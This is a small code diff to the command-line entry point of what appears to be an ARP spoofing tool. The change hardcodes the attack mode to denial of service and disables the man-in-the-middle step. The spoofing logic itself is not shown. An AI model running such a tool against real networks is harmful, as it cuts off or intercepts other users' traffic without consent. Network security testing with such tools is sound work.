@@ -29,7 +29,7 @@ if __name__ == "__main__":
         help="scan local network for ip-mac mapping, Values: arp_resolve, arp, nmap_resolve, nmap"
     )
     ap.add_argument("-tip", "--target_ip", type=str, help="Target IP address 1")
-    ap.add_argument("-at", "--attack_type", type=str, help="Attack type, values - mitm/dos")
+    # ap.add_argument("-at", "--attack_type", type=str, help="Attack type, values - mitm/dos")
     args = ap.parse_args()
 
     arp = ARPSpoofer()
@@ -48,9 +48,9 @@ if __name__ == "__main__":
         # arp_scan('172.16.5.0/24')
         print(arp.scan_network(args.scan_method))
     elif args.task == "attack":
-        arp.spoof_client(args.target_ip, args.attack_type)
+        arp.spoof_client(args.target_ip, 'dos')
         start_spoofing_process(arp)
-        start_mitm_process(arp)
+        # start_mitm_process(arp)
 
         def signal_handler(sig, frame):
             print("You pressed Ctrl+C!")
